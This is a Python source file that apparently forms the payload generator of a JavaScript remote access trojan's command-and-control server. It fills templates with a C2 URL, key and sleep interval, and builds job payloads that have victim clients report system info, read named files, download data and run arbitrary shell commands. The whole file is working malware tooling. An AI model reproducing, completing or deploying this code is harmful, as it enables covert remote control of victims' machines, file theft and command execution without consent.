#!/usr/bin/env python3
#coding:utf-8

import os

class Payload(object):
    payload_flag = {'init': ['~URL_RAT~',],
                    'rat': ['~URL_RUN~', '~KEY~', '~SLEEP~']
                    }
    payload_path = './template'

    def __init__(self):
        pass

    @classmethod
    def __load_payload(cls, name):
        with open(os.path.join(cls().payload_path, name)) as f:
            return f.read()

    @classmethod
    def payload_init(cls, *args, **kwargs):
        '''
        初始化js脚本，并发送到客户端执行，主要是让客户端访问rat.js脚本
        '''
        rat_url = 'http://{}:{}/rat'.format(args[0][0], args[0][1])
        payload_content = cls().__load_payload('init.js').replace('~URL_RAT~', rat_url)
        return payload_content
    @classmethod
    def payload_rat(cls, *args, **kwargs):
        run_url = 'http://{}:{}/'.format(args[0][0], args[0][1])
        payload_content = cls().__load_payload('rat.js').replace('~URL_RUN~', run_url)
        payload_content = payload_content.replace('~KEY~', 'aaaa')
        payload_content = payload_content.replace('~SLEEP~', '5')

        return payload_content
    @classmethod
    def payload_info(cls, *args, **kwargs):
        jobID = kwargs['jobID']
        payload = cls().__load_payload('info.js').replace('~JOB_ID~', str(jobID))
        return payload

    @classmethod
    def payload_cat(cls, *args, **kwargs):
        jobID = kwargs['jobID']
        payload = cls().__load_payload('cat.js').replace('~JOB_ID~', str(jobID))
        payload = payload.replace('~FILENAME~', kwargs['filename'])
        return payload

    @classmethod
    def payload_download(cls, *args, **kwargs):
        jobID = kwargs['jobID']
        payload = cls().__load_payload('download.js').replace('~JOB_ID~', str(jobID))
        return payload

    @classmethod
    def payload_shell(cls, *args, **kwargs):
        cmd = kwargs['cmd']
        jobID = kwargs['jobID']
        payload = cls().__load_payload('shell.js').replace('~JOB_ID~', str(jobID))
        payload = payload.replace('~CMD~', cmd)
        return payload

    
    